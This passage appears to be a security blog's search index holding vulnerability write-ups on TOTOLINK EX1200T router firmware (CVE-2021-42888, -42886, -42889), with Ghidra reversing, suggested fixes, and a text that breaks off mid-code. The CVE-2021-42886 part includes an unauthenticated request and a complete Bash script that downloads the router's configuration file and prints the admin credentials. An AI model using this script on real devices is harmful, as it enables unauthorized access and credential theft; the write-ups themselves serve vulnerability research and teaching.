CsteSystem(\"rm -f /web_cste/js/language.js 1&gt;/dev/null 2&gt;&amp;1\", 0);  // Set up the path for the new language.js file and create a symbolic link to it sprintf(acStack_140, \"/web_cste/js/language_%s.js\", langType); sprintf(acStack_140, \"ln -s /web_cste/js/language_%s.js /web_cste/js/language.js 1&gt;/dev/null 2&gt;&amp;1\", langType); CsteSystem(acStack_140, 0);  // Set the langType and langFlag parameters in the system apmib_set(0x1772, langType); langFlag = (char*)websGetVar(param_2, \"langFlag\", \"1\"); local_1c = atoi(langFlag); apmib_set(0x1777, &amp;local_1c);  // Check if the product.ini file exists and set the helpUrl parameter in the system iVar1 = f_exists(\"/mnt/custom/product.ini\"); if (iVar1 != 0) { sprintf(acStack_140, \"helpUrl_%s\", langType); inifile_get_string(\"/mnt/custom/product.ini\", \"PRODUCT\", acStack_140, &amp;local_40); apmib_set(0x1bc8, &amp;local_40); }  // Update the web configuration apmib_update_web(4);  // Remove the existing language.js file CsteSystem(\"rm -f /web_cste/js/language.js 1&gt;/dev/null 2&gt;&amp;1\", 0);  // Set up the path for the new language.js file and create a symbolic link to it sprintf(acStack_140, \"/web_cste/js/language_%s.js\", langType); sprintf(acStack_140, \"ln -s /web_cste/js/language_%s.js /web_cste/js/language.js 1&gt;/dev/null 2&gt;&amp;1\", langType); CsteSystem(acStack_140, 0);  // Set the response and return 0 websSetCfgResponse(param_1, param_3, &amp;DAT_0001eca4, \"reserv\"); return 0;   Now, we created an array then condition checks if it is a valid two-letter language code by comparing it with the values in the languages array. If the langType parameter is not valid, the code exits without executing further commands.       Conclusion   In this analysis we saw the root cause of the issue and how it can be solved in an example code, Also how we can analysis the unclear decompiled code to understand as much as we can of the code and make it clear.Finally, You have to keep each code under it’s condition.       References           https://www.totolink.net/home/news/me_name/id/39/menu_listtpl/DownloadC.html            https://github.com/p1Kk/vuln/blob/dcc2b75ab49f8cb0bdadf6f3c5d6b379a73e57c5/totolink_ex1200t_langtype_rce.md            https://ghidra-sre.org/            https://github.com/scriptingxss/owasp-fstm/releases/download/v1.0/Firmware_Security_Testing_Methodology_Version1.pdf       #CVE-2021-42888  ","categories": ["IoT Exploitation"],
        "tags": [],
        "url": "http://localhost:5000/iot%20exploitation/CVE_2021_42888/",
        "teaser": "http://localhost:5000/assets/images/clf9btj1u3wq60knu00om57eu.png"
      },{
        "title": "CVE-2021-42886: TOTOLINK EX1200T Information disclosure vulnerability",
        "excerpt":"Introduction   A vulnerability discovered in TOTOLINK EX1200T model known as CVE-2021-42886 which lead to a leak of configurations file to unauthorized user, as a results anyone exploit this vulnerability can get the user name and password of the device. Note:(Everything you obtain here is for educational purposes, Don't use or abuse any bug against any target without permissions)   Obtaining the Firmware   Before we start we would need the firmware of the device, Therefore We can take a static look at the code and how it works to understand more. So, what we need is the vulnerable Firmware for the device which is V4.1.2cu.5215 and we have many ways to do it:           You can search for the firmware on the official website for the vendor.            Download it from any other source (after someone already dump it from the device and published it).            Dump the firmware through UART, You could read a detailed blog from Here.            Also, you could contact the support to provide you with the firmware.            Finally dumping the firmware using CH341A Mini programmer USB, You could read a detailed blog from Here.       In my case, I found the firmware on the vendor website. Now, Let’s extract the firmware using binwalk tool as the following binwalk -e --run-as=root \"TOTOLINK_C8180E-1C_EX1200T_WX022_8197F_SPI_8M64M_V4.1.2cu.5215_B20210330_ALL.web\" and here is the output:   $ ls TOTOLINK_C8180E-1C_EX1200T_WX022_8197F_SPI_8M64M_V4.1.2cu.5215_B20210330_ALL.web $ sudo binwalk -e --run-as=root \"TOTOLINK_C8180E-1C_EX1200T_WX022_8197F_SPI_8M64M_V4.1.2cu.5215_B20210330_ALL.web\" [sudo] password for azima:  DECIMAL       HEXADECIMAL     DESCRIPTION -------------------------------------------------------------------------------- 76            0x4C            JFFS2 filesystem, little endian 209052        0x3309C         Zlib compressed data, compressed 209388        0x331EC         Zlib compressed data, compressed 210144        0x334E0         Zlib compressed data, compressed 210832        0x33790         JFFS2 filesystem, little endian 231428        0x38804         Zlib compressed data, compressed 231988        0x38A34         Zlib compressed data, compressed 232548        0x38C64         Zlib compressed data, compressed 233116        0x38E9C         Zlib compressed data, compressed 233560        0x39058         JFFS2 filesystem, little endian 254344        0x3E188         Zlib compressed data, compressed 254696        0x3E2E8         JFFS2 filesystem, little endian 255224        0x3E4F8         Zlib compressed data, compressed 256064        0x3E840         JFFS2 filesystem, little endian 321636        0x4E864         LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 6526520 bytes   And as i am using Windows Subsystem Linux (WSL), Here we can browser our firmware normally:      The Analysis   When we first open the /cgi-bin directory under the web_cste folder we can see the following shell files:   ExportIbmsConfig.sh ExportSettings.sh ExportSyslog.sh   The file we want to take a look at is ExportSettings.sh   #!/bin/sh  #output HTTP header eval `flash get HARDWARE_MODEL` dateStr=`date  '+%Y%m%d'` filename=\\\"Config-$HARDWARE_MODEL-$dateStr.dat\\\"  echo \"Pragma: no-cache\\n\" echo \"Cache-control: no-cache\\n\" echo \"Content-type: application/octet-stream\" echo \"Content-Transfer-Encoding: binary\"                        #  \"\\n\" make Un*x happy echo \"Content-Disposition: attachment; $filename\" echo \"\"  cat /var/config.dat 2&gt;/dev/null   the flash command to get the value of the HARDWARE_MODEL environment variable and then uses the eval command to set that value as a shell variable, dateStr is a variable to the current date in the format YYYYMMDD, filename is a variable to a string that includes the hardware model and date in the format Config-HARDWARE_MODEL-YYYYMMDD.dat..   echo \"Pragma: no-cache\\n\" echo \"Cache-control: no-cache\\n\" echo \"Content-type: application/octet-stream\" echo \"Content-Transfer-Encoding: binary\" echo \"Content-Disposition: attachment; $filename\" echo \"\"   The above lines are output of the HTTP headers for the response, They set various headers like Pragma, Cache-control, Content-type, Content-Transfer-Encoding, and Content-Disposition with the filename set to the filename variable defined before. As we can see it’s obvious that the file is used to extract the current device settings &amp; configurations, Which contains the Username &amp; Password. Now, Let’s go to Burp Suite and request the file /cgi-bin/ExportSettings.sh:      As we ca see in the screenshot of, When we requested the file, It response us back with the same headers which contains the .dat file name.      When we request the file it will show us a redirect status (302code) and when we follow the redirect it will show us that the file is not found. Now, If we navigate to the admin panel and go to system configuration tab to export configuration it will work. As we have the requests of the process in Burp Suite, We can notice the following request:   GET /cgi-bin/cstecgi.cgi?action=save&amp;setting HTTP/1.1 Host: 192.168.0.254 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36 Connection: close Cache-Control: max-age=0   The request doesn’t need any authentication or authorization or even check for the session when you request it. So, basically when you request this link it will generate the configuration file and you can download it. Let’s take a look on how this file get generated. Let’s go with Ghidra and reverse the cstecgi.cgi file. Now, By going to the file and check it with the file command, We can see it’s an ELF 32bit MIPS file:      Open it and create a new project i named it EX1200T for the device name and drop the cstecgi.cgi file into the project:      After that open the file using Code Browser within Ghidra:      Then, analysis the file:      Navigating to Symbol Tree and let’s check out the functions:      After going through the functions clearly inside FUN_00400dd8 function we can see the following lines of codes. But, there is no thing interesting and it’s all about functions calling other functions:      We just can see that httpStatus, redirectURL &amp; responseParam being passed to some unclear functions. But, You can see under \\squashfs-root\\lib\\cste_modules folder that there are libraries named as the following:   app.so cloudupdate.so global.so lan.so product.so system.so upgrade.so wireless.so wps.so   After reversing this libraries you will know that it’s clearly used by the cstecgi.cgi to perform different operations and changes through the device panel. Let’s identify which one perform the export for the configuration process by searching through the following Bash one liner using strings command:   for i in $(ls -la | awk '{print $9}' | grep \".so\"); do echo \"\"; echo \"Lib Name: $i\"; strings $i | grep \"Config\"; done   The above line will print the library name after this will run the strings command on the library to get any string has the word Config and will print the results under the library name. Therefore, we will be able to know which library contains the Config process or anything related. Command output:   Lib Name: app.so getAppStatusConfig getAppEasyWizardConfig setAppEasyWizardConfig getAppWanConfig setAppWanConfig getAppWiFiConfig setAppWiFiConfig getAppMultiApConfig setAppMultiApConfig 'getAppStatusConfig getAppEasyWizardConfig setAppEasyWizardConfig getAppWanConfig setAppWanConfig getAppWiFiConfig setAppWiFiConfig getAppMultiApConfig setAppMultiApConfig  Lib Name: cloudupdate.so  Lib Name: global.so getSaveConfig getInitConfig setWanDnsConfig getSaveConfig getInitConfig cp /web_cste/config.dat /web_cste/Config-%s-%s.dat ,\"redirectURL\":\"http://%s/Config-%s-%s.dat\"}  Lib Name: lan.so setLanConfig getLanConfig setStaticDhcpConfig delStaticDhcpConfig getStaticDhcpConfig 'setLanConfig getLanConfig setStaticDhcpConfig delStaticDhcpConfig getStaticDhcpConfig  Lib Name: product.so  Lib Name: system.so getMiniUPnPConfig setMiniUPnPConfig getMiniUPnPConfig setMiniUPnPConfig  Lib Name: upgrade.so MM_ConfigFileInvalid MM_ConfigSizeErr MM_ConfigFileErr  Lib Name: wireless.so setWiFiBasicConfig getWiFiBasicConfig setWiFiAdvancedConfig getWiFiAdvancedConfig setWiFiMultipleConfig getWiFiMultipleConfig delWiFiMultipleConfig getWiFiAclAddConfig setWiFiAclAddConfig setWiFiAclDeleteConfig getWiFiWdsAddConfig setWiFiWdsAddConfig setWiFiWdsDeleteConfig getWiFiRepeaterConfig setWiFiRepeaterConfig getWiFiScheduleConfig setWiFiScheduleConfig getWiFiApConfig setWiFiApConfig getWiFiExtenderConfig setWiFiExtenderConfig setWiFiBasicConfig getWiFiBasicConfig setWiFiAdvancedConfig getWiFiAdvancedConfig setWiFiMultipleConfig getWiFiMultipleConfig delWiFiMultipleConfig getWiFiAclAddConfig setWiFiAclAddConfig setWiFiAclDeleteConfig getWiFiWdsAddConfig setWiFiWdsAddConfig setWiFiWdsDeleteConfig getWiFiRepeaterConfig setWiFiRepeaterConfig getWiFiScheduleConfig setWiFiScheduleConfig getWiFiApConfig setWiFiApConfig getWiFiExtenderConfig setWiFiExtenderConfig  Lib Name: wps.so setWiFiWpsConfig getWiFiWpsConfig getWiFiWpsSetupConfig setWiFiWpsSetupConfig setWiFiWpsConfig getWiFiWpsConfig getWiFiWpsSetupConfig setWiFiWpsSetupConfig   And as we can see that there are tons of it’s with-in the libraries and after a lot of search i found it under the global.so library, As we did with the cstecgi.cgi file. Let’s do the same with the library using Ghidra. After opening the Functions tab under Symbol Tree we can notice the getSaveConfig function:      So, We can say the save configuration process is as the following:      Now, Let’s navigate to the function and understand what this function do and how it works. First the function start by taking 3 parameters:   undefined4 getSaveConfig(undefined4 param_1,undefined4 param_2,undefined4 param_3)   After that the rest of the code is declaring of variables until we reach the line number 65:      The save_cs_to_file(); is a call for external function and then __src which storing the value retrieved with http_host from the http request and the \"\" value will be used if the requested variable is not found which refers to the device hostname/ip, After that there is an IF condition which checks if the first character of __src is null character or no, If that true it will call a function named getLanIp() and from it’s name we can guess it’s getting the IP address for the device NIC. Everything is clear it checks for the Hostname or IP. Finally, if it’s not empty then it will copy the __src value to the local_c8 which also could be a hostname. Now, let’s rename the variables as we know it’s usage. Moving to the following lines:      Here, It assigns the status of request to the acSTack_10C8 we can rename it to reqResponse. And the response will redirect the user. Then, It gets the length of reqResponse and assign it to sVar1. the call for the apmib_get() function is for retrieving a value from a data structure and storing it in the local_x variables. After that opens the file config.dat in append mode and assigns a file pointer to the variable __s, We can rename it to configFile.      By moving to the following lines, It checks if the file cannot be opened then it will print error massege, If the file is opened successfully, The code writes a single byte DAT_0001dc0c to the file,followed by the contents of the local_38 variable.Then closing the file after this, The code then retrieves the current date using the date command and formats it as a string in local_88. Then using the sprintf() function to create a system command that copies the config.dat file to a new file named Config-[local_a8]-[local_88].dat, Finally the command executed using the system() function as it saved in acStack_78. Now, we understand how the file is created and as we can send the unauthorized request to create it, Let’s do it and take a look on the file.      Here we sent the request, you can see in the response it’s redirect to the location of the file configuration file, If we follow the request we can see the file contents:      Now, Let’s download the file normally and extract the strings from it using strings command.      As we can see when we run strings command we can notice the !admin string and below it we can notice the !1337. And normally it looks like the admin which is the user and 1337 which is the password &amp; the ! sign coming from the file. If we take a look again by printing the line number of each string we got, You can see clearly that the username and password got the 6th &amp; 7th lines.      Now, Let’s automate the process using Bash script to exploit it and print out the user name and password.   #!/bin/bash  ip=$1 url=\"http://${ip}/cgi-bin/cstecgi.cgi?action=save&amp;setting\"  echo \"[*] Target: $ip\" echo \"[+] Sending creation request....\" response=$(curl -i -X GET $url \\            -H \"Host: ${ip}\" \\            -H 'Accept-Encoding: gzip, deflate' \\            -H 'Accept: */*' \\            -H 'Accept-Language: en-US;q=0.9,en;q=0.8' \\            -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36' \\            -H 'Connection: close' \\            -H 'Cache-Control: max-age=0' \\            --max-redirs 0) echo \"[+] Creation Request Sent\" location_header=$(echo \"$response\" | grep -i location | awk '{print $2}' | tr -d '\\r') new_url=$(echo \"$location_header\") file_name=$(echo \"$location_header\" | awk -F \"/\" '{print $4}') if [[ ! -z \"$new_url\" ]]; then echo \"[+] Requesting the File......\"     response_body=$(curl -s -X GET \"$new_url\" \\          -H \"Host: ${ip}\" \\          -H 'Accept-Encoding: gzip, deflate' \\          -H 'Accept: */*' \\          -H 'Accept-Language: en-US;q=0.9,en;q=0.8' \\          -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36' \\          -H 'Connection: close' \\          -H 'Cache-Control: max-age=0') echo \"[+] File Requested\" echo \"$response_body\" &gt;&gt; $file_name echo \"[+] File saved to $file_name\" echo \"[*] Username and Password:\" echo \"$response_body\" | strings | sed -n '6,7p' | sed 's/\\!//g' fi   Basically, Our script will take a target as an argument and then send the creation request of the configuration file, After that it will take the value of Location header to location_header and save it to new_url. The, Cut the url in the Location header which is the configuration file url and take the file name &amp; save it to file_name variable, Finally, It sends the request to the file url and save it to the file name on the disk and filter out the username and password. Now, It’s the time to use it:      Final Thoughts   The developer shall always check for the user session before performing any kinds of request and if the user’s session is valid or no, Another thing is to delete the configuration file from the web directory as it will be open for anyone to download it. So, the final code can be as the following:     Host = (char *)websGetVar(param_2,\"http_host\",\"\");   if (*Host == '\\0') {     getLanIp(&amp;deviceIP);   }   else {     strcpy((char *)&amp;deviceIP,Host);   }      snprintf(reqResponse,0x1000,\"{\\\"httpStatus\\\":\\\"%s\\\",\\\"host\\\":\\\"%s\\\"\",\"302\",(char *)&amp;deviceIP);   sVar1 = strlen(reqResponse);   apmib_get(0x4655,&amp;local_a8);   apmib_get(0x1bbe,&amp;local_38); if (userSession){       __s = fopen(\"/web_cste/config.dat\",\"ab\");       if (__s == (FILE *)0x0) {         perror(\"fopen\");         uVar2 = 0;       }       else {         fwrite(&amp;DAT_0001dc0c,1,1,__s);         __size = strlen((char *)&amp;local_38);         fwrite(&amp;local_38,__size,1,__s);         fclose(__s);         getCmdStr(\"date  \\'+%Y%m%d\\'\",&amp;local_88,0x10);         sprintf(acStack_78,\"cp /web_cste/config.dat /web_cste/Config-%s-%s.dat\",(char *)&amp;local_a8,                 (char *)&amp;local_88);         system(acStack_78);         snprintf(reqResponse + sVar1,0x1000 - sVar1,\",\\\"redirectURL\\\":\\\"http://%s/Config-%s-%s.dat\\\"}\",                  (char *)&amp;deviceIP,(char *)&amp;local_a8,(char *)&amp;local_88);         uVar2 = websGetCfgResponse(param_1,param_3,reqResponse);       }   return uVar2; } else {     exit(1);  } }   Now, it will check for the user session if it’s valid it will complete in creating the file and send back a valid response to the user, If not then it will exit the function.   Conclusion   We have seen the analysis for the CVE-2021-42886, How the configurations file is created for the user to save as a backup, The importance of using encryption method to prove the confidentiality of the data and highlighted the mistakes made by the developer.   References           https://www.totolink.net/home/news/me_name/id/39/menu_listtpl/DownloadC.html            https://github.com/p1Kk/vuln/blob/dcc2b75ab49f8cb0bdadf6f3c5d6b379a73e57c5/totolink_ex1200t_exportsettings_leak.md            https://ghidra-sre.org/            https://github.com/scriptingxss/owasp-fstm/releases/download/v1.0/Firmware_Security_Testing_Methodology_Version1.pdf       #CVE-2021-42886 #totolink  ","categories": ["IoT Exploitation"],
        "tags": [],
        "url": "http://localhost:5000/iot%20exploitation/CVE_2021_42886/",
        "teaser": "http://localhost:5000/assets/images/clfhkdx1o0zyi0jk82f8ugbdr.png"
      },{
        "title": "CVE-2021-42889: Access Points information leak",
        "excerpt":"Introduction   A vulnerability discovered in TOTOLINK EX1200T model known as CVE-2021-42889 which lead to an exposure of sensitive information such as (wifikey, wifiname) and many more of the AP configurations, as a results anyone exploit this vulnerability can get access to the network. Note:(Everything you obtain here is for educational purposes, Don't use or abuse any bug against any target without permissions)   Obtaining the Firmware   Before we start we would need the firmware of the device, Therefore We can take a static look at the code and how it works to understand more. So, what we need is the vulnerable Firmware for the device which is V4.1.2cu.5215 and we have many ways to do it:           You can search for the firmware on the official website for the vendor.            Download it from any other source (after someone already dump it from the device and published it).            Dump the firmware through UART, You could read a detailed blog from Here.            Also, you could contact the support to provide you with the firmware.            Finally dumping the firmware using CH341A Mini programmer USB, You could read a detailed blog from Here.       In my case, I found the firmware on the vendor website. Now, Let’s extract the firmware using binwalk tool as the following binwalk -e --run-as=root \"TOTOLINK_C8180E-1C_EX1200T_WX022_8197F_SPI_8M64M_V4.1.2cu.5215_B20210330_ALL.web\" and here is the output:   $ ls TOTOLINK_C8180E-1C_EX1200T_WX022_8197F_SPI_8M64M_V4.1.2cu.5215_B20210330_ALL.web $ sudo binwalk -e --run-as=root \"TOTOLINK_C8180E-1C_EX1200T_WX022_8197F_SPI_8M64M_V4.1.2cu.5215_B20210330_ALL.web\" [sudo] password for azima:  DECIMAL       HEXADECIMAL     DESCRIPTION -------------------------------------------------------------------------------- 76            0x4C            JFFS2 filesystem, little endian 209052        0x3309C         Zlib compressed data, compressed 209388        0x331EC         Zlib compressed data, compressed 210144        0x334E0         Zlib compressed data, compressed 210832        0x33790         JFFS2 filesystem, little endian 231428        0x38804         Zlib compressed data, compressed 231988        0x38A34         Zlib compressed data, compressed 232548        0x38C64         Zlib compressed data, compressed 233116        0x38E9C         Zlib compressed data, compressed 233560        0x39058         JFFS2 filesystem, little endian 254344        0x3E188         Zlib compressed data, compressed 254696        0x3E2E8         JFFS2 filesystem, little endian 255224        0x3E4F8         Zlib compressed data, compressed 256064        0x3E840         JFFS2 filesystem, little endian 321636        0x4E864         LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 6526520 bytes   And as i am using Windows Subsystem Linux (WSL), Here we can browser our firmware normally:      The Analysis   It’s the time for the analysis. We will need Burp Suite to see how is the request made that exposing these sensitive information. When we login to the device panel and go to AP Settings tab &amp; then go to Burp Suite and look at the made requests we can see the following request:   POST /cgi-bin/cstecgi.cgi HTTP/1.1 Host: 192.168.0.254 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 38 Origin: http://192.168.0.254 DNT: 1 Connection: close Referer: http://192.168.0.254/ap.asp?timestamp=1679528272527 Cookie: SESSION_ID=2:1617145753:2  {\"topicurl\":\"setting/getWiFiApConfig\"}   And if we go to the response tab for this request we can see it leaks all the information about the APs including the name and the key for each one:      Let’s go with Ghidra and reverse the cstecgi.cgi file. Now, By going to the file and check it with the file command, We can see it’s an ELF 32bit MIPS file:      Open it and create a new project i named it EX1200T for the device name and drop the cstecgi.cgi file into the project:      After that open the file using Code Browser within Ghidra:      Then, analysis the file:      Navigating to Symbol Tree and let’s check out the functions:      After going through the functions clearly inside FUN_00400dd8 function we can see the following lines of codes. But, there is no thing interesting and it’s all about functions calling other functions:      We just can see that httpStatus, redirectURL &amp; responseParam being passed to some unclear functions. But, You can see under \\squashfs-root\\lib\\cste_modules folder that there are libraries named as the following:   app.so cloudupdate.so global.so lan.so product.so system.so upgrade.so wireless.so wps.so   After reversing this libraries you will know that it’s clearly used by the cstecgi.cgi to perform different operations and changes through the device panel. Let’s identify which one contains the getWiFiApConfig by searching through the following Bash one liner using strings command:   for i in $(ls -la | awk '{print $9}' | grep \".so\"); do echo \"\"; echo \"Lib Name: $i\"; strings $i | grep \"getWiFiApConfig\"; done   The above line will print the library name after this will run the strings command on the library to get any string has the word getWiFiApConfig and will print the results under the library name. Therefore, we will be able to know which library get the information about the APs or anything related. Command output:   Lib Name: app.so  Lib Name: cloudupdate.so  Lib Name: global.so  Lib Name: lan.so  Lib Name: product.so  Lib Name: system.so  Lib Name: upgrade.so  Lib Name: wireless.so getWiFiApConfig getWiFiApConfig  Lib Name: wps.so   And as we can see it’s with-in the wireless.so library, As we did with the cstecgi.cgi file. Let’s do the same with the library with Ghidra. After opening the Functions tab under Symbol Tree we can notice the getWiFiApConfig function:      So, We can say the flaw is as the following:      getWiFiApConfig   Now, Let’s navigate to the function and understand what this function do and how it works. First the function start by taking 3 parameters   undefined4 getWiFiBasicConfig(undefined4 param_1,undefined4 param_2,undefined4 param_3)   After that the rest of the code is declering of variables until we reach the line number 41:      The code starts with sets the names of the wireless networks wlan0 and wlan0-vxd, and then uses the SetWlan_idx() function to set the index of the wireless network to wlan0, After that retrieves the SSID of the wireless network using the apmib_get() function and adds it to a JSON object named uVar1.Then retrieves the wireless channel and regulatory domain of the network and adds them to the JSON object, Also it gets the band (either 2.4GHz or 5GHz) of the wireless network and adds it to the JSON object. Finally, it calls the getRepeaterStatus() function to retrieve the status of a wireless repeater and stores the result in the variable iVar3. We can clearly guess that &amp;local_68 is the wlan0, &amp;local_60 is the wlan0-vxd and uVar1 is the JSON object. So, Let’s rename these variables in Ghidra to make the code more clear.      The following lines is a condition checks If iVar2 is equal to 1 then it will call the getWirelessChannel() function with &amp;wlan0 as an argument and assign the results to local_30[0] Variable. If iVar2 is not equal to 1 then it calls apmib_get() with arguments of 2 and local_30 which presumably retrieves some value from configurations on device setting and stores it in local_30[0].      The above lines of code do the same as the previous lines but for the 5G wireless network.      the above lines sprintf() function is used for formats the string with an integer value from local_30[0] and stores the result in the memory location pointed to by local_50, Then a cJSON string is created using the previously formatted string and assigned to uVar1 and a cJSON string is added to jsonData with the key channel, After that wireless key is retrieved by calling the getWirelessKey() function with &amp;wlan0 as an argument and the result is assigned to uVar1 &amp; then cJSON string is created using the wireless key and assigned to uVar1, After that cJSON string is added to jsonData with a key represented by &amp;DAT_000214d4. It checks if a file named /mnt/custom/product.ini exists by calling the f_file_exist() function. Then results assigned to iVar2. We have a IF condition if the file doesn’t exist, a cJSON string with value 0 is created and added to jsonData with the key edupSupport. else If the file exists, it reads the edupSupport value from the PRODUCT section in the INI file, creates a cJSON string with that value, and adds it to jsonData with the same key. Then, SetWlan_idx() function is called with the &amp;wlan0 argument. Finally, jsonData is printed, and the result is assigned to __ptr which passed to the webGetCfgResponse() to send it as a response for the user.   getWiFiApInfo   Another function leaking the same and more information about the APs including the status of the AP and many more, if we navigate to the function code in Ghidra as the following:      It’s mostly do the same as the getWiFiApConfig function but with more information included.   Function code:   undefined4 getWiFiApInfo(undefined4 param_1,undefined4 param_2,undefined4 param_3)  {   undefined4 uVar1;   char *__nptr;   int iVar2;   undefined4 uVar3;   int iVar4;   void *__ptr;    //... VARIABLES    __nptr = (char *)websGetVar(param_2,\"wifiIdx\",\"0\");   iVar2 = atoi(__nptr);   sprintf((char *)&amp;local_238,\"wlan%d\",iVar2);   sprintf((char *)&amp;local_230,\"wlan%d-va0\",iVar2);   sprintf((char *)&amp;local_220,\"wlan%d-va1\",iVar2);   sprintf((char *)&amp;local_210,\"wlan%d-vxd\",iVar2);   SetWlan_idx(&amp;local_238);   uVar3 = getOperationMode();   uVar5 = FUN_00020b20(uVar3);   uVar3 = cJSON_CreateNumber((int)uVar5,(int)((ulonglong)uVar5 &gt;&gt; 0x20));   cJSON_AddItemToObject(uVar1,\"operationMode\",uVar3);   apmib_get(2,&amp;local_5c);   uVar5 = FUN_00020b20(local_5c);   uVar3 = cJSON_CreateNumber((int)uVar5,(int)((ulonglong)uVar5 &gt;&gt; 0x20));   cJSON_AddItemToObject(uVar1,\"channel\",uVar3);   uVar3 = getWirelessChannel(&amp;local_238);   uVar5 = FUN_00020b20(uVar3);   uVar3 = cJSON_CreateNumber((int)uVar5,(int)((ulonglong)uVar5 &gt;&gt; 0x20));   cJSON_AddItemToObject(uVar1,\"autoChannel\",uVar3);   uVar3 = getWirelessBand(&amp;local_238);   uVar5 = FUN_00020b20(uVar3);   uVar3 = cJSON_CreateNumber((int)uVar5,(int)((ulonglong)uVar5 &gt;&gt; 0x20));   cJSON_AddItemToObject(uVar1,\"band\",uVar3);   iVar4 = is_interface_up(&amp;local_238);   local_5c = (uint)(iVar4 == 0);   uVar5 = FUN_00020b20(local_5c);   uVar3 = cJSON_CreateNumber((int)uVar5,(int)((ulonglong)uVar5 &gt;&gt; 0x20));   cJSON_AddItemToObject(uVar1,\"wifiOff1\",uVar3);   apmib_get(1,&amp;local_13c);   uVar3 = cJSON_CreateString(&amp;local_13c);   cJSON_AddItemToObject(uVar1,\"ssid1\",uVar3);   getIfMac(&amp;local_238,&amp;local_118);   uVar3 = cJSON_CreateString(&amp;local_118);   cJSON_AddItemToObject(uVar1,\"bssid1\",uVar3);   uVar3 = getAuthMode(&amp;local_238);   sprintf((char *)&amp;local_104,\"%s\",uVar3);   uVar3 = getEncrypType(&amp;local_238);   sprintf((char *)&amp;local_94,\"%s\",uVar3);   uVar3 = getWirelessKey(&amp;local_238);   uVar3 = cJSON_CreateString(uVar3);   cJSON_AddItemToObject(uVar1,\"wifiKey1\",uVar3);   memset(local_200,0,0x41);   memset(local_200,0,0x41);   sprintf(acStack_1bc,\"cat proc/%s/sta_info | grep active | cut -f2 -d \\':\\' | cut -f1 -d \\')\\'\",           &amp;local_238);   local_5c = getCmdVal(acStack_1bc);   uVar5 = FUN_00020b20(local_5c);   uVar3 = cJSON_CreateNumber((int)uVar5,(int)((ulonglong)uVar5 &gt;&gt; 0x20));   cJSON_AddItemToObject(uVar1,\"staNum1\",uVar3);   SetWlan_idx(&amp;local_230);   apmib_get(0x16,&amp;local_5c);   uVar5 = FUN_00020b20(local_5c);   uVar3 = cJSON_CreateNumber((int)uVar5,(int)((ulonglong)uVar5 &gt;&gt; 0x20));   cJSON_AddItemToObject(uVar1,\"wifiOff2\",uVar3);   apmib_get(1,&amp;local_13c);   uVar3 = cJSON_CreateString(&amp;local_13c);   cJSON_AddItemToObject(uVar1,&amp;DAT_00021938,uVar3);   getIfMac(&amp;local_230,&amp;local_118);   uVar3 = cJSON_CreateString(&amp;local_118);   cJSON_AddItemToObject(uVar1,\"bssid2\",uVar3);   uVar3 = getAuthMode(&amp;local_230);   sprintf((char *)&amp;local_f4,\"%s\",uVar3);   uVar3 = getEncrypType(&amp;local_230);   sprintf((char *)&amp;local_8c,\"%s\",uVar3);   uVar3 = getWirelessKey(&amp;local_230);   uVar3 = cJSON_CreateString(uVar3);   cJSON_AddItemToObject(uVar1,\"wifiKey2\",uVar3);   if (local_5c == 0) {     memset(local_200,0,0x41);     sprintf(acStack_1bc,\"cat /proc/%s/sta_info | grep hwaddr | awk \\'{count++} END{print count}\\'\",             &amp;local_230);     iVar4 = getCmdResult(acStack_1bc,local_200,0x41);     if ((iVar4 == 0) &amp;&amp; (local_200[0] != '\\0')) {       iVar4 = atoi(local_200);     }     else {       iVar4 = 0;     }     uVar5 = FUN_00020b20(iVar4);     uVar3 = cJSON_CreateNumber((int)uVar5,(int)((ulonglong)uVar5 &gt;&gt; 0x20));     cJSON_AddItemToObject(uVar1,\"staNum2\",uVar3);   }   else {     uVar3 = cJSON_CreateNumber(0,0);     cJSON_AddItemToObject(uVar1,\"staNum2\",uVar3);   }   SetWlan_idx(&amp;local_220);   apmib_get(0x16,&amp;local_5c);   uVar5 = FUN_00020b20(local_5c);   uVar3 = cJSON_CreateNumber((int)uVar5,(int)((ulonglong)uVar5 &gt;&gt; 0x20));   cJSON_AddItemToObject(uVar1,\"wifiOff3\",uVar3);   apmib_get(1,&amp;local_13c);   uVar3 = cJSON_CreateString(&amp;local_13c);   cJSON_AddItemToObject(uVar1,\"ssid3\",uVar3);   getIfMac(&amp;local_220,&amp;local_118);   uVar3 = cJSON_CreateString(&amp;local_118);   cJSON_AddItemToObject(uVar1,\"bssid3\",uVar3);   uVar3 = getAuthMode(&amp;local_220);   sprintf((char *)&amp;local_e4,\"%s\",uVar3);   uVar3 = getEncrypType(&amp;local_220);   sprintf((char *)&amp;local_84,\"%s\",uVar3);   uVar3 = getWirelessKey(&amp;local_220);   uVar3 = cJSON_CreateString(uVar3);   cJSON_AddItemToObject(uVar1,\"wifiKey3\",uVar3);   if (local_5c == 0) {     memset(local_200,0,0x41);     sprintf(acStack_1bc,\"cat /proc/%s/sta_info | grep hwaddr | awk \\'{count++} END{print count}\\'\",             &amp;local_220);     iVar4 = getCmdResult(acStack_1bc,local_200,0x41);     if ((iVar4 == 0) &amp;&amp; (local_200[0] != '\\0')) {       iVar4 = atoi(local_200);     }     else {       iVar4 = 0;     }     uVar5 = FUN_00020b20(iVar4);     uVar3 = cJSON_CreateNumber((int)uVar5,(int)((ulonglong)uVar5 &gt;&gt; 0x20));     cJSON_AddItemToObject(uVar1,\"staNum3\",uVar3);   }   else {     uVar3 = cJSON_CreateNumber(0,0);     cJSON_AddItemToObject(uVar1,\"staNum3\",uVar3);   }   sprintf(acStack_d4,\"%s;%s;%s\",&amp;local_104,&amp;local_f4,&amp;local_e4);   sprintf((char 